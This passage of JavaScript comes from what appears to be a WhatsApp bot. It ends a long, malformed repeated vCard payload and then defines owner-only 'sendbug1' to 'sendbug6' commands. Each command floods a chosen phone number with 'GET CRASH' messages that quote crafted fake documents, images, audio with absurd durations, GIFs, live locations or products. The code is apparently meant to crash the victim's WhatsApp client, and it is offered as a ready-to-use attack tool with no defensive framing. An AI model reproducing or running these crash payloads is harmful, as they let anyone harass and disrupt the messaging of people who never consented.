karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./pict.jpg') }, { upload: haikal.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
						"degreesLatitude": -6.936928157735237,
						"degreesLongitude": 107.72270679473877,
						"caption": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${philips}`,
						"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: kontolfariz })
haikal.relayMessage(m.chat, location.message, { messageId: location.key.id })
}
}
break
case 'sendbug1':{
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let fdoc = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
documentMessage: {
title: `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`, 
jpegThumbnail: fs.readFileSync(`./pict.jpg`),
}
}
} 
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc})
await m.reply(`Succes`)
}
break
case 'sendbug2':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let foto = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`, 
"jpegThumbnail": thumb
} 
} 
}
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto})
await m.reply(`Succes`)
break
case 'sendbug3':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let fvoc = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"audioMessage": {
"mimetype":"audio/ogg; codecs=opus",
"seconds": "400000271",
"ptt": "true"
}
} 
}
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc})
await m.reply(`Succes`)
break
case 'sendbug4':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let fgif = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "videoMessage": { 
"title":"hallo bang","h": 
`Hmm`,'seconds': '359996400', 
'gifPlayback': 'true', 
'caption': `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
'jpegThumbnail': fs.readFileSync(`./pict.jpg`),
}
}
}
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif})
await m.reply(`Succes`)
break 
case 'sendbug5':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let floc = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
liveLocationMessage: {
caption: `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
jpegThumbnail: fs.readFileSync(`./pict.jpg`), 
}
}
}
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc})
await m.reply(`Succes`)
break
case 'sendbug6':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let ftoko = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
"productMessage": { 
"product": { 
"productImage":{ 
"mimetype": "image/jpeg", 
"jpegThumbnail": fs.readFileSync(`./pict.jpg`)}, 
"title": "© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲", 
"description": "© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲", 
"currencyCode": "USD", 
"priceAmount1000": "5000000000", 
"retailerId": "© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲", 
"productImageCount": 1}, 
"businessOwnerJid": `6285814480623@s.whatsapp.net`}}}	
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko})
